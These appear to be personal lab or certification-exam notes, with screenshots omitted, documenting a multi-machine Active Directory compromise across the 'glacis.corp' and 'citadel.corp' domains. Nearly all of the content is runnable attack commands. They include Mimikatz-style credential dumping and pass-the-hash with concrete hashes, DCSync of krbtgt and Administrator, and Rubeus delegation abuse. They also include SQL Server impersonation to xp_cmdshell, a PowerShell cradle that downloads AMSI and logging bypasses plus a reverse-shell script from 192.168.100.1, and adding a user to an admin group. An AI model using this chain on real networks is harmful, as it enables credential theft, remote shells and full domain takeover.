


Machine 1


![[Pasted image 20250331134427.png]]


![[Pasted image 20250331133858.png]]


using admodule

![[Pasted image 20250331134128.png]]


 ./SafetyKatz.exe "sekurlsa::ekeys" "exit"

![[Pasted image 20250331141931.png]]

 ./SafetyKatz.exe
 
 sekurlsa::pth /user:sharemanager /rc4:ad1b41d88cfd57b08f0fb50b1eee2541 /domain:CITADEL /sid:S-1-5-21-253487801-221673152-1815095224-1109 /run:cmd.exe

![[Pasted image 20250331184809.png]]


![[Pasted image 20250331152914.png]]

![[Pasted image 20250331152930.png]]

notepad \\srv71\ScheduledQueries\Queries.ps1


![[Pasted image 20250331152949.png]]

![[Pasted image 20250331184551.png]]

![[Pasted image 20250331184603.png]]

Machine 2



![[Pasted image 20250331194141.png]]

 .\SQLRecon.exe /a:winToken /h:SQLSRV3.glacis.corp /m:info

![[Pasted image 20250331194230.png]]


 
 .\SQLRecon.exe /a:winToken /h:SQLSRV3.glacis.corp /m:impersonate

![[Pasted image 20250331194246.png]]

 .\SQLRecon.exe /a:winToken /h:SQLSRV3.glacis.corp /m:query /c:"EXECUTE AS LOGIN = 'sqlsrv3adm'; EXECUTE AS LOGIN = 'sa'; EXEC xp_cmdshell 'whoami'; REVERT; REVERT;"

![[Pasted image 20250331204745.png]]

 .\SQLRecon.exe /a:winToken /h:SQLSRV3.glacis.corp /m:query /c:"EXECUTE AS LOGIN = 'sqlsrv3adm'; EXECUTE AS LOGIN = 'sa'; EXEC xp_cmdshell 'powershell -c iex(New-Object Net.WebClient).DownloadString(''http://192.168.100.1/sbloggingbypass.txt''); iex(New-Object Net.WebClient).DownloadString(''http://192.168.100.1/amsibypass.txt''); iex(New-Object Net.WebClient).DownloadString(''http://192.168.100.1/Invoke-PowerShellTcpEx.ps1'')'; REVERT; REVERT;"


![[Pasted image 20250331204825.png]]


![[Pasted image 20250331204841.png]]

machine 3

 Get-DomainUser -Identity dbmaster -Properties msDS-AllowedToDelegateTo

![[Pasted image 20250401104639.png]]


.\SafetyKatz.exe "lsadump::dcsync /user:krbtgt /authuser:dbmaster"

![[Pasted image 20250401104601.png]]


./Rubeus.exe s4u /user:dbmaster /aes256:842cd67c2aa74fa6c6472796180f5063b7437a3fdbfb3f9903b0d0741f17e959 /impersonateuser:administrator /msdsspn:"time/glacis-dc.glacis.corp" /altservice:ldap /domain:glacis.corp /ptt

![[Pasted image 20250401182850.png]]

./SharpKatz.exe --Command dcsync --User Administrator --Domain glacis.corp --DomainController glacis-dc.glacis.corp

![[Pasted image 20250401182948.png]]


./Rubeus.exe asktgt /user:Administrator /domain:glacis.corp /rc4:3bb32a944573427d3abeb19be73745ef /ptt



![[Pasted image 20250401183647.png]]


![[Pasted image 20250401183020.png]]


machine 4



 .\SafetyKatz.exe "lsadump::dcsync /user:glacis\glacis-dc$"  exit

![[Pasted image 20250402002414.png]]


![[Pasted image 20250402012547.png]]


.\SafetyKatz.exe "sekurlsa::pth /user:glacis-dc$ /domain:glacis.corp /ntlm:5e29a1dc54573fb8b9d9087269793377 /run:powershell.exe" "exit"

![[Pasted image 20250402002719.png]]

net group pawadmins studentuser /domain /add

 ./safetykatz.exe "sekurlsa::logonpasswords" "exit"

![[Pasted image 20250402003128.png]]

.\SafetyKatz.exe "sekurlsa::pth /user:studentuser /domain:citadel.corp /ntlm:4d85769c6a8592329ad5e958cf2b2332 /run:powershell.exe" "exit"

Enter-PSSession PAWSRV

![[Pasted image 20250402003436.png]]

Machine 5
![[Pasted image 20250402012947.png]]


.\SafetyKatz.exe "sekurlsa::logonpasswords" "exit"

![[Pasted image 20250402004248.png]]

.\SafetyKatz.exe "sekurlsa::pth /user:pawsrv$ /domain:glacis.corp /ntlm:fcddffc4d586ef9d3dc9bd26c4c17614 /run:powershell.exe" "exit"

![[Pasted image 20250402004342.png]]

./SafetyKatz.exe "lsadump::dcsync /domain:citadel.corp /user:Adminstrator"

![[Pasted image 20250402004514.png]]

.\SafetyKatz.exe "sekurlsa::pth /user:Administrator /domain:citadel.corp /ntlm:1a7bf8d59d5e6e599f641802ee7d2948 /run:powershell.exe" "exit"

![[Pasted image 20250402004614.png]]

Enter-Pssession -computername citadel-dc

![[Pasted image 20250402004658.png]]

